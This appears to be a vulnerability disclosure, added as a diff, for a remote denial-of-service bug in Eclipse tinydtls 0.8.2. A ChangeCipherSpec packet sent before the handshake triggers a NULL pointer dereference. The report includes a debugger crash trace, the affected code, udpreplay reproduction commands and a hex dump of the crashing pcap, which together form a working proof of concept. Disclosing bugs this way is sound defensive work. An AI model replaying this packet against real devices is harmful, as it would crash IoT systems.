@@ -1,0 +1,101 @@
+> Eclipse tinydtls 0.8.2 for Eclipse IoT allows remote attackers to
+> cause a denial of service (DTLS peer crash) by sending a "Change cipher spec" packet without pre-handshake.
+>
+> ------------------------------------------
+>
+> [Additional Information]
+> tiny-dtls is used to run in IoT devices.
+>
+> 0x406eb9 <dtls_handle_message+649>     test   r15, r15
+> 0x406ebc <dtls_handle_message+652>     je     dtls_handle_message+671       <0x406ecf>
+>
+> 0x406ecf <dtls_handle_message+671>     cmp    dword ptr [r15 + 0xcc], 5
+> 0x406ed7 <dtls_handle_message+679>     mov    rsi, qword ptr [r15 + 0xe0]
+>
+> -----------------------------------------------------------------------------------------------
+> 3469   if (!peer || peer->state != DTLS_STATE_WAIT_CHANGECIPHERSPEC) {
+> 3470     dtls_warn("expected ChangeCipherSpec during handshake\n");
+> 3471     return 0;
+> 3472   }
+> 3473
+> [---------------------STACK---------------------------------------------------------------------]
+> 00:0000 rsp  0x7fffffffe090  0x1
+> 01:0008      0x7fffffffe098  0x613118 (recvfrom@got.plt)  0x7ffff7b10320 (recvfrom)  cmp    dword ptr [rip + 0x2c8d4d], 0
+> 02:0010      0x7fffffffe0a0  0x1
+> 03:0018      0x7fffffffe0a8  0x614010  0xcb13c8b131e3b81c
+> 04:0020      0x7fffffffe0b0  0xeffffe2c8
+> 05:0028      0x7fffffffe0b8  0xe
+> 06:0030      0x7fffffffe0c0  0x0
+> 07:0038      0x7fffffffe0c8  0x7fffffffe2c0  0x1c
+> [---------------------BACKTRACE-----------------------------------------------------------------]
+>  ? f 0           406ecf dtls_handle_message+671
+>    f 1           406ecf dtls_handle_message+671
+>    f 2           40181f main+1231
+>    f 3           40181f main+1231
+>    f 4     7ffff7a36f45 __libc_start_main+245
+>    f 5           40197e _start+41
+> Program received signal SIGSEGV (fault address 0xcc)
+> pwndbg>
+>
+> ------------------------------------------
+>
+> [VulnerabilityType Other]
+> NULL Pointer dereference
+>
+> ------------------------------------------
+>
+> [Vendor of Product]
+> https://projects.eclipse.org/proposals/tinydtls
+>
+> ------------------------------------------
+>
+> [Affected Product Code Base]
+> tinydtls - release-0.8.2
+>
+> ------------------------------------------
+>
+> [Affected Component]
+> tinydtls, dtls.c , dtls_handle_message()->case DTLS_CT_CHANGE_CIPHER_SPEC:,  handle_ccs(),
+> if (!peer || peer->state != DTLS_STATE_WAIT_CHANGECIPHERSPEC)  // peer->state is null
+>
+> ------------------------------------------
+>
+> [Attack Type]
+> Remote
+>
+> ------------------------------------------
+>
+> [Impact Denial of Service]
+> true
+>
+> ------------------------------------------
+>
+> [Attack Vectors]
+> DTLS must have hand shake like below.
+> client hello -> server hello -> certificate verify -> change cipher spec -> hello request....
+> but DTLS do not verify before status.
+> The DTLS peer get crash if i send "Change cipher spec" packet without pre-handshakes.
+>
+> here are example.
+> $./dtls-server-example.elf &
+> $ udpreplay -i lo change_cipher_spec.pcap
+> segmentation fault.
+>
+> $ xxd change_cipher_spec.pcap
+>
+> 0000000: d4c3 b2a1 0200 0400 0000 0000 0000 0000  ................
+> 0000010: ffff 0000 0100 0000 b831 d258 100e 0900  .........1.X....
+> 0000020: 3800 0000 3800 0000 0000 0000 0000 0000  8...8...........
+> 0000030: 0000 0000 0800 4500 002a 909c 4000 4011  ......E..*..@.@.
+> 0000040: ac24 7f00 0001 7f00 0001 b54f 4efc 0016  .$.........ON...
+> 0000050: fe29 14fe fd00 0000 0000 0000 0500 0101  .)..............
+>
+> ------------------------------------------
+>
+> [Reference]
+> https://projects.eclipse.org/proposals/tinydtls
+>
+> ------------------------------------------
+>
+> [Discoverer]
+> sangsup.lee (k1rh4) , sunwoo.kim(hamzzi)
